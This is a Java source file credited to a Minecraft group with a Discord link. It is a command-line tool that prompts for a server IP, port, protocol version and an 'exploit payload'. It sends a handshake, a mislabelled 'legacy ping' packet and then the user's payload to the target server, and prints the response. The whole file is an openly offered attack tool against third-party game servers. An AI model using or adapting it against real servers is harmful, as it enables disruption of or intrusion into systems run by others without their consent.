// Source Created By Terror MC
//  Discord : https://discord.gg/fhpRaJKdKs

import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
import java.util.Scanner;

public class Main {

    public static void main(String[] args) {
        Scanner sc = new Scanner(System.in);

        System.out.print("Server IP: ");
        String host = sc.nextLine().trim();

        System.out.print("Server Port (default 25565): ");
        String portInput = sc.nextLine().trim();
        int port = portInput.isEmpty() ? 25565 : Integer.parseInt(portInput);

        System.out.print("Protocol version (default 47 for 1.8.x): ");
        String protoInput = sc.nextLine().trim();
        int protocol = protoInput.isEmpty() ? 47 : Integer.parseInt(protoInput);

        System.out.print("Exploit payload: ");
        String payload = sc.nextLine();

        try (Socket socket = new Socket(host, port);
             DataOutputStream out = new DataOutputStream(socket.getOutputStream());
             InputStream in = socket.getInputStream()) {

            sendHandshake(out, host, port, protocol);
            sendLegacyPing(out);
            sendPayload(out, payload);

            byte[] buffer = new byte[65536];
            int read;
            while ((read = in.read(buffer)) != -1) {
                System.out.write(buffer, 0, read);
            }

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static void sendHandshake(DataOutputStream out, String host, int port, int protocol) throws IOException {
        ByteArray ba = new ByteArray();
        ba.writeVarInt(0);
        ba.writeVarInt(protocol);
        ba.writeString(host);
        ba.writeShort(port);
        ba.writeVarInt(1);
        out.write(ba.toByteArray());
        out.flush();
    }

    private static void sendLegacyPing(DataOutputStream out) throws IOException {
        ByteArray ba = new ByteArray();
        ba.writeVarInt(0);
        out.write(ba.toByteArray());
        out.flush();
    }

    private static void sendPayload(DataOutputStream out, String payload) throws IOException {
        ByteArray ba = new ByteArray();
        ba.writeVarInt(0);
        ba.writeString(payload);
        out.write(ba.toByteArray());
        out.flush();
    }

    private static class ByteArray {
        private final java.io.ByteArrayOutputStream buffer = new java.io.ByteArrayOutputStream();

        public void writeVarInt(int v) throws IOException {
            while ((v & 0xFFFFFF80) != 0) {
                buffer.write((v & 0x7F) | 0x80);
                v >>>= 7;
            }
            buffer.write(v);
        }

        public void writeString(String s) throws IOException {
            byte[] bytes = s.getBytes(StandardCharsets.UTF_8);
            writeVarInt(bytes.length);
            buffer.write(bytes);
        }

        public void writeShort(int v) throws IOException {
            buffer.write((v >>> 8) & 0xFF);
            buffer.write(v & 0xFF);
        }

        public byte[] toByteArray() {
            byte[] data = buffer.toByteArray();
            java.io.ByteArrayOutputStream packet = new java.io.ByteArrayOutputStream();
            try {
                writeVarInt(packet, data.length);
                packet.write(data);
            } catch (IOException ignored) {}
            return packet.toByteArray();
        }

        private void writeVarInt(java.io.OutputStream out, int v) throws IOException {
            while ((v & 0xFFFFFF80) != 0) {
                out.write((v & 0x7F) | 0x80);
                v >>>= 7;
            }
            out.write(v);
        }
    }
}
